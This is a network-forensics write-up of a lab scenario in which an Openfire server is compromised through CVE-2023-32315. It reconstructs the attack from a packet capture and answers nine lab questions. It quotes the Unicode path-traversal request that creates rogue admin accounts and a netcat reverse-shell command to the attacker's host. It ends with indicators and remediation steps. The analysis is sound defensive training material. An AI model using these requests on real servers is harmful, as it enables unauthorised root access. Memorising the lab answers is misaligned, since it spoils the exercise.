# Incident Report: Openfire – CVE-2023-32315 Authentication Bypass, Malicious JAR Plugin Deployment & Root Reverse Shell

| Metadata | Details |
| :--- | :--- |
| **Date** | November 2026 |
| **Analyst** | Piotr Asyngier |
| **Tools Used** | Wireshark (`Openfire.pcap`), CyberChef |
| **Category** | Network Forensics, Path Traversal Exploitation & Post-Exploitation Analysis |
| **Affected Environment** | Openfire Messaging Server (`192.168.18.155:9090`, Container Host: `b0704a182efe` / `172.17.0.2`) |

---

## 1. Executive Summary

Following a suspected data breach targeting the organization's **Openfire** messaging server (`192.168.18.155:9090`), a packet-level forensic analysis of the captured network traffic (`Openfire.pcap`, comprising `10,394` packets) was performed in **Wireshark**. The investigation traced legitimate administrative baselines, identified the initial exploitation vector, and reconstructed the attacker's post-exploitation commands.

The investigation confirmed a full remote code execution (RCE) compromise originating from **`192.168.18.160`** via **`CVE-2023-32315`** (Openfire Admin Console Authentication Bypass / Path Traversal):

1. **Legitimate Baseline Activity:** At `2024-08-18 15:39:53 UTC`, a legitimate administrator (`192.168.18.1`) authenticated to `/login.jsp` as `admin` (`Admin@Passw0rd#@#`, CSRF token: `tmJU6J9uym8oIOD`).
2. **Authentication Bypass & Rogue Admin Creation (`CVE-2023-32315`):** Starting at `15:54:59 UTC`, the attacker (`192.168.18.160`) bypassed authentication using Unicode-encoded path traversal (`/setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp`) to create three unauthorized administrative accounts (`3536rr`, `7z0fas`, and `a7zo4l`).
3. **Malicious Plugin Deployment & Web Shell:** Authenticating to `/login.jsp` as **`a7zo4l`**, the attacker uploaded a weaponized Java archive plugin (**`openfire-plugin.jar`**) via `/plugin-admin.jsp`, exposing a JSP command shell (`/plugins/openfire-plugin/cmd.jsp`) where they first ran **`whoami`**.
4. **Interactive Reverse Shell (`root`):** The attacker leveraged **`netcat`** (`nc 192.168.18.160 8888 -e /bin/bash`) to obtain an interactive `root` shell on TCP port `8888`, enumerating the host (`whoami`, `id`, `uname -a`, **`ifconfig`**, and directory listings).

---

## 2. Network Traffic Investigation & Technical Analysis

### 2.1. Initial Login Request CSRF Token & Password Extraction (`tmJU6J9uym8oIOD` / `Admin@Passw0rd#@#`)

To establish baseline administrative activity and locate the first login session, packet capture traffic was filtered for HTTP `POST` requests targeting `/login.jsp`.

* **Wireshark Display Filter:**
  ```text
  http.request.method == "POST"
  ```
* **Findings (`Frame 879`, `tcp.stream eq 18`):**
  * At **`2024-08-18 15:39:53.786129 UTC`**, host `192.168.18.1` (`Src Port: 45220`) submitted a `POST /login.jsp HTTP/1.1` request (`application/x-www-form-urlencoded`) to `192.168.18.155:9090`.
  * Inspecting the HTTP stream (`tcp.stream eq 18`) revealed the session cookie and POST body:
    ```text
    Cookie: JSESSIONID=node0yie0vcha60j1zwmq442011y82.node0; csrf=tmJU6J9uym8oIOD
    login=true&csrf=tmJU6J9uym8oIOD&username=admin&password=Admin%40Passw0rd%23%40%23
    ```
  * **CSRF Token (Q1):** **`tmJU6J9uym8oIOD`**
  * **Decoded Password (Q2):** URL-decoding `Admin%40Passw0rd%23%40%23` in **CyberChef** (`%40` -> `@`, `%23` -> `#`) yielded **`Admin@Passw0rd#@#`**.

<img width="1852" height="921" alt="obraz" src="https://github.com/user-attachments/assets/41a8e194-ecb9-42a0-8f7b-e1b87d032025" />

<img width="1852" height="921" alt="obraz" src="https://github.com/user-attachments/assets/8b92a773-413a-4e5f-b80d-2fecebc62f9b" />

<img width="1852" height="921" alt="obraz" src="https://github.com/user-attachments/assets/592a929e-f343-49c8-8b96-775cddeac627" />

<img width="1852" height="921" alt="obraz" src="https://github.com/user-attachments/assets/36c732c2-6881-4f48-af85-83709f282ae0" />


---

### 2.2. Path Traversal Exploitation & First Rogue Account Created (`3536rr`)

To trace unauthorized user account creation after the baseline login (`Frame 879`), HTTP traffic containing the keyword `"user"` was filtered.

* **Wireshark Display Filter:**
  ```text
  http contains "user" and frame.number > 879
  ```
* **Findings (`Frame 9920`, `tcp.stream eq 1180`):**
  * After failed login attempts from `192.168.18.160` (`15:54:25`–`15:54:33 UTC`), the attacker exploited an unauthenticated path traversal flaw by sending `GET` requests using UTF-16/Unicode-encoded dot-dot sequences (`%u002e%u002e`) under `/setup/setup-s/`.
  * At **`2024-08-18 15:54:59.987558 UTC`** (Frame `9920`), the attacker issued the first rogue admin creation request:
    ```text
    GET /setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?csrf=yGWwGRL3IKMHPFX&username=3536rr&name=&email=&password=dc0b2y&passwordConfirm=dc0b2y&isadmin=on&create=%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7 HTTP/1.1
    ```
  * URL-decoding in **CyberChef** resolved the path to `/setup/setup-s/../../user-create.jsp`, creating an admin account (`isadmin=on`) with:
    * **First Created Username (Q3):** **`3536rr`** (Password: `dc0b2y`).
  * Shortly afterward, the attacker repeated the exploit to create two additional admin accounts: `7z0fas` (`Frame 9962`, `15:55:10 UTC`) and `a7zo4l` (`Frame 9987`, `15:55:14 UTC`).

<img width="1852" height="921" alt="obraz" src="https://github.com/user-attachments/assets/93e2faed-e559-4511-9e47-2d0180ea895c" />

<img width="1852" height="921" alt="obraz" src="https://github.com/user-attachments/assets/4ab29965-cf6a-4e7b-86e1-5b80c28d6ac2" />

<img width="1852" height="921" alt="obraz" src="https://github.com/user-attachments/assets/237f2cee-53c1-44b4-bbac-23faf4faa2f9" />


---

### 2.3. Attacker Admin Panel Login (`a7zo4l`)

To determine which of the newly created accounts the attacker actively used to log into the Openfire Admin Console, HTTP traffic containing `"username"` was examined.

* **Wireshark Display Filter:**
  ```text
  http contains "username"
  ```
* **Findings (`Frame 10003`, `tcp.stream eq 1185`):**
  * At **`2024-08-18 15:55:42.147137 UTC`**, attacker host `192.168.18.160` (`Src Port: 60840`) sent a `POST /login.jsp HTTP/1.1` request:
    ```text
    url=%2Findex.jsp&login=true&csrf=6hjU0T4C1C95NfC&username=a7zo4l&password=54hwc2
    ```
  * The server responded with `HTTP/1.1 302 Found` (`Location: http://192.168.18.155:9090/index.jsp`), confirming successful administrative authentication using **`a7zo4l`** (Q4).

<img width="1852" height="921" alt="obraz" src="https://github.com/user-attachments/assets/68f98fe1-9782-4086-8b0b-e346bfc4dc9d" />

<img width="1852" height="921" alt="obraz" src="https://github.com/user-attachments/assets/92d0def3-1080-4f62-9399-d0e5e852108c" />

<img width="1852" height="921" alt="obraz" src="https://github.com/user-attachments/assets/45339e80-09a9-4042-b9cc-2d3a17bacb6c" />


---

### 2.4. Malicious Plugin Upload (`openfire-plugin.jar`)

Once authenticated inside the Openfire Admin Console (`tcp.stream eq 1185`), the attacker navigated to the plugin management page (`/plugin-admin.jsp`) to upload a malicious `.jar` plugin for arbitrary code execution.

* **Wireshark Display Filter:**
  ```text
  http.request.method == "POST"
  ```
  *(Followed by inspecting `tcp.stream eq 1185` around `Frame 10158`)*
* **Findings (`Frame 10158`):**
  * At **`2024-08-18 15:56:07.799783 UTC`**, `192.168.18.160` sent `POST /plugin-admin.jsp?uploadplugin&csrf=kp87ERFbIG5hdA6 HTTP/1.1` (`Content-Length: 30776`).
  * Searching `tcp.stream eq 1185` for `filename` exposed the uploaded multipart payload header:
    ```text
    Content-Disposition: form-data; name="uploadfile"; filename="openfire-plugin.jar"
    Content-Type: application/java-archive
    ```
  * **Uploaded Plugin Name (Q5):** **`openfire-plugin.jar`**

<img width="1852" height="921" alt="obraz" src="https://github.com/user-attachments/assets/12c36d17-6564-4875-9cea-a5b4d59b7c9a" />

<img width="1852" height="921" alt="obraz" src="https://github.com/user-attachments/assets/7322f4e0-34c6-40e7-b83b-28a1c8aa4162" />


---

### 2.5. Web Shell Execution (`whoami`) & Reverse Shell Tool (`netcat`)

Following deployment of `openfire-plugin.jar`, the attacker accessed the plugin's embedded JSP web shell at `/plugins/openfire-plugin/cmd.jsp?action=command` within the same persistent HTTP stream (`tcp.stream eq 1185`).

* **Findings (Searching `tcp.stream eq 1185` for `command`):**
  1. **First Command Executed (`Frame 10246`, `15:56:39.329945 UTC`):**
     * `POST /plugins/openfire-plugin/cmd.jsp?action=command HTTP/1.1`
     * **Payload:** `command=whoami`
     * **First Command (Q6):** **`whoami`**
  2. **Reverse Shell Execution (`Frame 10291`, `15:56:57.999184 UTC`):**
     * `POST /plugins/openfire-plugin/cmd.jsp?action=command HTTP/1.1`
     * **Encoded Payload:** `command=nc+192.168.18.160+8888+-e+%2Fbin%2Fbash`
     * **URL-Decoded Command:** `nc 192.168.18.160 8888 -e /bin/bash`
     * **Reverse Shell Tool (Q7):** **`netcat`** (`nc`)

<img width="1852" height="921" alt="obraz" src="https://github.com/user-attachments/assets/e5e4a07e-060c-43b7-bd67-c95649e318e2" />

<img width="1852" height="921" alt="obraz" src="https://github.com/user-attachments/assets/11f38973-5d40-45a6-a7c8-8e31b5ea3012" />


---

### 2.6. Interactive Reverse Shell Session & Network Enumeration (`ifconfig`)

Pivoting from the decoded `netcat` command (`192.168.18.160:8888`), Wireshark was filtered for traffic on TCP port `8888` to reconstruct the attacker's interactive shell session.

* **Wireshark Display Filter:**
  ```text
  tcp.port == 8888
  ```
* **Findings (`tcp.stream eq 1192`, starting at `Frame 10292`, `15:56:58.002724 UTC`):**
  * The compromised Openfire server (`192.168.18.155:35653`) established an outbound TCP reverse shell to `192.168.18.160:8888`.
  * Following `tcp.stream eq 1192` revealed the full sequence of commands executed with **`root`** privileges:
    ```bash
    whoami      # -> root
    id          # -> uid=0(root) gid=0(root) groups=0(root)...
    uname -a    # -> Linux b0704a182efe 6.5.0-44-generic #44~22.04.1-Ubuntu ... x86_64 Linux
    ifconfig    # -> eth0 (inet addr:172.17.0.2, HWaddr 02:42:AC:11:00:02) & lo (127.0.0.1)
    ls          # -> extra  openfire  openfire.sh  openfirectl
    cd //
    ls
    ```
  * **Network Interface Enumeration Command (Q8):** **`ifconfig`**

<img width="1852" height="921" alt="obraz" src="https://github.com/user-attachments/assets/b3321af3-e0d9-42f4-9141-8cb6b3052da3" />

<img width="1852" height="921" alt="obraz" src="https://github.com/user-attachments/assets/fb1d6cf4-9f4d-44af-a7d0-c896ed6f180a" />

<img width="1852" height="921" alt="obraz" src="https://github.com/user-attachments/assets/700a6400-e702-4ef8-9f5e-d362fe7c52ec" />

<img width="1852" height="921" alt="obraz" src="https://github.com/user-attachments/assets/6969118a-233d-461a-9854-19adad9feaff" />


---

### 2.7. Exploited Vulnerability Identification (`CVE-2023-32315`)

Correlating the unauthenticated UTF-16 path traversal bypass (`/setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp`) with the subsequent administrative login and malicious `.jar` plugin upload via `/plugin-admin.jsp` confirms exploitation of a well-known critical Openfire vulnerability:

* **CVE Identifier (Q9):** **`CVE-2023-32315`** — *Ignite Realtime Openfire Administrative Console Path Traversal & Authentication Bypass (affecting Openfire versions `3.10.0` through `4.6.7` and `4.7.0` through `4.7.4`)*.

<img width="1852" height="921" alt="obraz" src="https://github.com/user-attachments/assets/b092e7ad-06c7-4aa7-af0d-d6f949273eb9" />


---

## 3. Attack Timeline (August 18, 2024)

| Timestamp (UTC) | Source IP | Destination IP | Protocol / Frame | Activity Description |
| :--- | :--- | :--- | :--- | :--- |
| `2024-08-18 15:39:53.78` | `192.168.18.1` | `192.168.18.155:9090` | `HTTP` (`#879`) | Legitimate `admin` login to `/login.jsp` (`csrf=tmJU6J9uym8oIOD`). |
| `2024-08-18 15:54:25.13` | `192.168.18.160` | `192.168.18.155:9090` | `HTTP` (`#9870-9880`) | Attacker probes `/login.jsp` with failed authentication attempts. |
| `2024-08-18 15:54:59.98` | `192.168.18.160` | `192.168.18.155:9090` | `HTTP` (`#9920`) | Exploits `CVE-2023-32315` (`/setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp`) to create first rogue admin `3536rr`. |
| `2024-08-18 15:55:10–14` | `192.168.18.160` | `192.168.18.155:9090` | `HTTP` (`#9962`, `#9987`) | Creates additional rogue admin accounts `7z0fas` and `a7zo4l`. |
| `2024-08-18 15:55:42.14` | `192.168.18.160` | `192.168.18.155:9090` | `HTTP` (`#10003`) | Authenticates to `/login.jsp` as `a7zo4l` (`password=54hwc2`). |
| `2024-08-18 15:56:07.79` | `192.168.18.160` | `192.168.18.155:9090` | `HTTP` (`#10158`) | Uploads malicious plugin `openfire-plugin.jar` (`30,776 B`) via `/plugin-admin.jsp`. |
| `2024-08-18 15:56:39.32` | `192.168.18.160` | `192.168.18.155:9090` | `HTTP` (`#10246`) | Executes first command (`whoami`) via `/plugins/openfire-plugin/cmd.jsp`. |
| `2024-08-18 15:56:57.99` | `192.168.18.160` | `192.168.18.155:9090` | `HTTP` (`#10291`) | Triggers Netcat reverse shell: `nc 192.168.18.160 8888 -e /bin/bash`. |
| `2024-08-18 15:56:58–57:43` | `192.168.18.155` | `192.168.18.160:8888` | `TCP` (`Stream 1192`) | Interactive `root` reverse shell: executes `whoami`, `id`, `uname -a`, `ifconfig`, `ls`. |

---

## 4. Consolidated Indicators of Compromise (IoCs)

| Indicator Type | Value | Context |
| :--- | :--- | :--- |
| **Attacker IPv4 / MAC** | `192.168.18.160` (`00:0c:29:0e:68:0a`) | Source of path traversal exploit, plugin upload, and C2 listener (`TCP/8888`) |
| **Target Server IPv4 / MAC** | `192.168.18.155:9090` (`00:0c:29:c2:dd:f4`) | Compromised Openfire server (Container `b0704a182efe`, `172.17.0.2`) |
| **Exploited CVE** | `CVE-2023-32315` | Openfire Admin Console path traversal via `/setup/setup-s/%u002e%u002e/%u002e%u002e/` |
| **Rogue Admin Accounts** | `3536rr:dc0b2y`, `7z0fas:ybd2zq`, `a7zo4l:54hwc2` | Unauthorized Openfire admin accounts (`isadmin=on`) created via `user-create.jsp` |
| **Malicious Plugin Artifact** | `openfire-plugin.jar` (`30,776 bytes`) | Weaponized Openfire plugin uploaded via `/plugin-admin.jsp` |
| **Web Shell URI** | `/plugins/openfire-plugin/cmd.jsp?action=command` | JSP web shell deployed by `openfire-plugin.jar` |
| **Reverse Shell Command** | `nc 192.168.18.160 8888 -e /bin/bash` | Netcat reverse shell executed to `192.168.18.160:8888` |

---

## 5. Summary of Lab Questions & Answers

| Question | Answer |
| :--- | :--- |
| **Q1:** What is the CSRF token value for the first login request? | `tmJU6J9uym8oIOD` |
| **Q2:** What is the password of the first user who logged in? | `Admin@Passw0rd#@#` |
| **Q3:** What is the 1st username that was created by the attacker? | `3536rr` |
| **Q4:** What is the username that the attacker used to login to the admin panel? | `a7zo4l` |
| **Q5:** What is the name of the plugin that the attacker uploaded? | `openfire-plugin.jar` |
| **Q6:** What is the first command that the user executed? | `whoami` |
| **Q7:** Which tool did the attacker use to get a reverse shell? | `netcat` |
| **Q8:** Which command did the attacker execute on the server to check for network interfaces? | `ifconfig` |
| **Q9:** What is the CVE of the vulnerability exploited? | `CVE-2023-32315` |

---

## 6. MITRE ATT&CK Mapping & Remediation

### MITRE ATT&CK Techniques
* **`T1190` – Exploit Public-Facing Application:** Exploiting `CVE-2023-32315` via Unicode-encoded path traversal (`/setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp`) to bypass Openfire Admin Console authentication.
* **`T1136.001` – Create Account: Local Account:** Creating unauthorized administrative users (`3536rr`, `7z0fas`, `a7zo4l`) inside Openfire.
* **`T1505.003` – Server Software Component: Web Shell:** Uploading `openfire-plugin.jar` to expose a persistent JSP command execution shell (`/plugins/openfire-plugin/cmd.jsp`).
* **`T1059.004` – Command and Scripting Interpreter: Unix Shell:** Executing `/bin/bash` via Netcat (`nc 192.168.18.160 8888 -e /bin/bash`) to establish an interactive `root` shell.
* **`T1016` / `T1033` – System Network Configuration & Owner/User Discovery:** Running `whoami`, `id`, `uname -a`, and `ifconfig` inside the reverse shell.

### Recommended Remediation Actions
1. **Immediate Patching (`CVE-2023-32315`):** Upgrade Ignite Realtime Openfire to version **`4.6.8`**, **`4.7.5`**, or later (or `4.8.x`+) which properly canonicalizes and blocks non-standard Unicode path traversal sequences in the Jetty/Admin Console authentication filter.
2. **Containment & Eradication:** Isolate `192.168.18.155`, rebuild the compromised Docker container (`b0704a182efe`) from a trusted image, remove `openfire-plugin.jar`, delete rogue admin accounts (`3536rr`, `7z0fas`, `a7zo4l`), and rotate the legitimate `admin` password (`Admin@Passw0rd#@#` was transmitted over unencrypted HTTP).
3. **Hardening & Least Privilege:** Run the Openfire container/service as a **non-root** user instead of `uid=0(root)`, enforce HTTPS (`TCP/9091`) instead of cleartext HTTP (`TCP/9090`), restrict Admin Console access to a dedicated management VLAN, and block unauthorized outbound connections (`TCP/8888`) at the egress firewall.
